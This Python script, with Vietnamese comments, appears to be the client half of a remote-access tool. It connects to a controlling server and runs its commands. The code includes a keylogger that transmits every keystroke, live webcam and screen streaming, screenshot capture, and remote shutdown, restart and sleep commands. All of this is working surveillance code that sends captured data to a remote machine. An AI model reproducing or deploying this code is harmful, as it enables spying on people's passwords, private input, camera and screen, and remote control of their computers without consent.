import socket

import cv2
import struct
import mss

import numpy as np
from pynput import keyboard

import os
import platform

import time


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


def stream_webcam(client_socket):
    print('Bắt đầu stream webcam...')
    cap = cv2.VideoCapture(0)

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
        data = buffer.tobytes()

        message_size = struct.pack("L", len(data))
        try:
            client_socket.sendall(message_size + data)
        except Exception as e:
            print("Mất kết nối stream:", e)
            break
    cap.release()


# --- HÀM CHỤP MÀN HÌNH MỚI THÊM VÀO ---
def take_screenshot(client_socket):
    print('Đang tiến hành chụp màn hình...')
    with mss.mss() as sct:
        # Chụp màn hình chính (Monitor 1)
        monitor = sct.monitors[1]
        screen_img = np.array(sct.grab(monitor))

        # Chuyển đổi hệ màu từ BGRA sang BGR
        frame = cv2.cvtColor(screen_img, cv2.COLOR_BGRA2BGR)

        # Nén ảnh thành JPEG chất lượng cao (85) để nhìn rõ chữ
        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        data = buffer.tobytes()

        # Đóng gói kích thước ảnh (4 bytes Header) và gửi sang Server
        message_size = struct.pack("L", len(data))
        try:
            client_socket.sendall(message_size + data)
            print('Đã gửi ảnh chụp màn hình thành công!')
        except Exception as e:
            print("Lỗi gửi ảnh chụp màn hình:", e)


def send_data(client_socket, message):
    try:
        # Code strings into bytes before sending over the network
        client_socket.sendall(f"{message}".encode('utf-8'))
    except Exception as e:
        print(f"\n[-] Error sending data: {e}")
        return False


def on_press(client_socket, key):
    try:
        send_data(client_socket, key.char)
    except AttributeError:
        # FIXED: If Esc is pressed, notify the server and stop the listener safely
        if key == keyboard.Key.esc:
            send_data(client_socket, "[ESC_STOP]")
            listener.stop()
        send_data(client_socket, f" [{key.name}] ")


def get_os():
    """Identifies the current operating system."""
    return platform.system()


def shutdown():
    """Shuts down the computer."""
    current_os = get_os()
    print("Initiating shutdown...")

    if current_os == "Windows":
        os.system("shutdown /s /t 0")
    elif current_os == "Linux":
        os.system("shutdown now")
    elif current_os == "Darwin":
        os.system("shutdown -h now")
    else:
        print(f"OS '{current_os}' not supported for this command.")


def restart():
    """Restarts the computer."""
    current_os = get_os()
    print("Initiating restart...")

    if current_os == "Windows":
        os.system("shutdown /r /t 0")
    elif current_os == "Linux":
        os.system("reboot")
    elif current_os == "Darwin":
        os.system("shutdown -r now")
    else:
        print(f"OS '{current_os}' not supported for this command.")


def sleep():
    """Puts the computer to sleep."""
    current_os = get_os()
    print("Initiating sleep mode...")

    if current_os == "Windows":
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    elif current_os == "Linux":
        os.system("systemctl suspend")
    elif current_os == "Darwin":
        os.system("pmset sleepnow")
    else:
        print(f"OS '{current_os}' not supported for this command.")


def share_screen(client_socket):
    print('Bắt đầu chia sẻ màn hình liên tục...')
    fps_target = 24
    frame_duration = 1.0 / fps_target

    with mss.mss() as sct:
        monitor = sct.monitors[1]

        while True:
            start_time = time.time()

            screen_img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(screen_img, cv2.COLOR_BGRA2BGR)

            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            data = buffer.tobytes()

            message_size = struct.pack("L", len(data))
            try:
                client_socket.sendall(message_size + data)
            except Exception as e:
                print("Mất kết nối chia sẻ màn hình:", e)
                break

            elapsed = time.time() - start_time
            sleep_time = frame_duration - elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)


# --- PHẦN LUỒNG CHÍNH CỦA CLIENT ---
CLIENT_IP = get_local_ip()
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((CLIENT_IP, 8080))  # Hãy đổi IP này thành IP máy server của bạn

client.send(b'Hello from client!')
message = client.recv(1024).decode()
print(message)

cmd = client.recv(1024).decode('utf-8')

while cmd != 'exit':
    if cmd == 'screenshot':
        # Gọi hàm chụp màn hình khi nhận lệnh từ server
        take_screenshot(client)
    elif cmd == 'stream':
        stream_webcam(client)
    elif cmd == 'screen':
        share_screen(client)
    elif cmd == 'keylogger':
        print("Monitoring keyboard and transmitting data... Press 'Esc' to exit.")
        with keyboard.Listener(on_press=lambda key: on_press(client, key)) as listener:
            listener.join()
    elif cmd.startswith('power:'):
        action = cmd.split(':')[1].strip()
        if action == 'shutdown':
            shutdown()
        elif action == 'restart':
            restart()
        elif action == 'sleep':
            sleep()
    cmd = client.recv(1024).decode('utf-8')
